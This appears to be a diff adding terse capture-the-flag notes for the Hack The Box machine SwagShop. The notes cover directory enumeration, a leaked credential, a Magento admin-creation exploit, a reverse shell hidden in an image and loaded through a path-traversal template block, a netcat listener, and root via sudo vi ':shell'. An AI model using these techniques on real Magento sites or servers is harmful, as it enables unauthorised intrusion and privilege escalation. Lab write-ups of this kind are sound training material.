@@ -1,0 +1,76 @@
+HTB SwagShop: 10.10.10.140 - CVE Heavy!
+
+[1] Initial nmap scan:
+ssh - 22
+http - 80 - Magento 2014 demo page store
+
+dirb:
+---- Scanning URL: http://10.10.10.140/ ----
+	==> DIRECTORY: http://10.10.10.140/app/
+
+		Found a user/pass here (but useless):
+			10.10.10.140/app/etc/local.xml -> root/fMVWh7bDHpgZkyfqQXreTjU9
+                                        
+	==> DIRECTORY: http://10.10.10.140/errors/                                     
+	+ http://10.10.10.140/favicon.ico (CODE:200|SIZE:1150)                         
+	==> DIRECTORY: http://10.10.10.140/includes/                                   
+	+ http://10.10.10.140/index.php (CODE:200|SIZE:16097)
+		
+			http://10.10.10.140/index.php/admin <======IMPORTANT!!!                         
+	
+	==> DIRECTORY: http://10.10.10.140/js/
+	==> DIRECTORY: http://10.10.10.140/js/calendar/                                
+	==> DIRECTORY: http://10.10.10.140/js/flash/                                   
+	==> DIRECTORY: http://10.10.10.140/js/lib/                                     
+	==> DIRECTORY: http://10.10.10.140/js/tiny_mce/                                          
+	==> DIRECTORY: http://10.10.10.140/lib/                                        
+	==> DIRECTORY: http://10.10.10.140/media/                                      
+	==> DIRECTORY: http://10.10.10.140/pkginfo/                                    
+	+ http://10.10.10.140/server-status (CODE:403|SIZE:300)                        
+	==> DIRECTORY: http://10.10.10.140/shell/                                      
+	==> DIRECTORY: http://10.10.10.140/skin/                                       
+	==> DIRECTORY: http://10.10.10.140/var/  
+
+[2] CVE Part:
+	> "searchsploit Magento"
+
+	==>adminlogin_exploit.py
+		CVE-2009-0541: https://www.exploit-db.com/exploits/37977 (creates admin account)
+
+			Worked! -> user/pass:forme/forme
+			Note: Magento v1.9.0.0
+
+	==> Found user!
+		Haris Swagger
+		haris@htbswag.net
+		username: haris
+
+[3] Found this exploit ==> https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper
+	
+	Froghopper (Reverse Shell Upload inside payload: goz.jpg):
+		(helpers: ip a s tun0, nc -nlvp 9999)
+		check ==> http://10.10.10.140/media/catalog/category (to see if shell was uploaded)
+	Template text:
+		{{block type='core/template' template='../../../../../../media/catalog/category/goz.jpg'}}
+
+GOT USER! ===> cat user.txt
+
+[4] ROOT Part
+
+	sudo -l
+
+	cd /var/www/html/
+ 	> script.sh
+	sudo /usr/bin/vi /var/www/html/
+type:   ":shell"
+press enter
+
+	id => root
+
+ROOTED! ===> cat root.txt
+
+
+
+
+
+
